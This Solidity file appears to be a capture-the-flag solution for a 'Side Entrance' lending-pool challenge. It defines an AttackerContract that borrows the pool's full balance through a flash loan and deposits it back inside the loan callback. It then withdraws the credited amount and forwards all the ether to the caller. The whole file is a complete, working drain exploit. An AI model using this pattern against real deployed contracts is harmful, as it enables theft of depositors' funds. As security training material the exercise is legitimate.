pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract AttackerContract is IFlashLoanEtherReceiver {

	function reentrancyAttack(address pool) public {
		SideEntranceLenderPool(pool).flashLoan(address(pool).balance);
		SideEntranceLenderPool(pool).withdraw();
		msg.sender.call{ value: address(this).balance }("");
	}

	function execute() external payable override {
		SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
	}

	receive() external payable {}
}